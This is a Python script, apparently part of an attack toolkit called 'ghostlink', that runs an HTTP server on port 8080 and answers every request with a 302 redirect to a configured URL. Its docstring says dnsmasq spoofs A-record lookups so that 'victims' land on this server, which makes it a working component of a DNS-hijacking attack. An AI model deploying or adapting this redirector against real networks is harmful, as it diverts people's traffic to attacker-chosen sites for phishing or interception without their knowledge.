#!/usr/bin/env python3
"""
Tiny HTTP 302 redirector on :8080. dnsmasq (configured by ghostlink.sh)
sends matching A-record lookups to our IP, so victims arrive here on :80
first — we need to also serve :80 or redirect :80->:8080 via some rule.
Here we just listen on :8080 so you can prove the mechanism works.

GET anything -> 302 Location: $REDIRECT_TO (+ preserved path).
"""
import os
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(os.environ.get("GL_ROOT", "/root/ghostlink"))


def getcfg(k):
    p = ROOT / "config.txt"
    if not p.exists(): return ""
    for ln in p.read_text().splitlines():
        s = ln.strip()
        if s.startswith(f"{k}="):
            return s.split("=", 1)[1].split("#", 1)[0].strip()
    return ""


class H(BaseHTTPRequestHandler):
    def log_message(self, *a, **k): pass

    def do_GET(self):
        to = getcfg("REDIRECT_TO") or "http://example.com"
        if not to.startswith("http"):
            to = "http://" + to
        preserve = getcfg("REDIRECT_PRESERVE_PATH").upper() != "FALSE"
        loc = to + (self.path if preserve and self.path != "/" else "")
        self.send_response(302)
        self.send_header("Location", loc)
        self.send_header("Content-Length", "0")
        self.send_header("Connection", "close")
        self.end_headers()

    def do_POST(self): self.do_GET()


if __name__ == "__main__":
    ThreadingHTTPServer(("0.0.0.0", 8080), H).serve_forever()
